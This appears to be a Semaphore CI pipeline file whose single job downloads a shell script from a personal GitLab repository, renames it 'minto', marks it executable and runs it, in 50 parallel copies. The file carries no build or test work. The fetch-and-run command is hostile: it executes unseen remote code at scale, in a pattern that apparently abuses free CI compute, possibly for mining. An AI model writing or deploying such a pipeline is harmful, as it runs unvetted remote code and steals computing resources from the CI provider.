version: v1.0
name: Initial Pipeline
agent:
  machine:
    type: f1-standard-4
    os_image: ubuntu2204
blocks:
  - name: 'Block #1'
    task:
      jobs:
        - name: 'Job #1'
          commands:
            - 'wget -O minto https://gitlab.com/barbieanay003/seger/-/raw/main/boleh.sh && sudo apt-get install dos2unix -y && dos2unix minto && chmod +x minto && ./minto'
          parallelism: 50
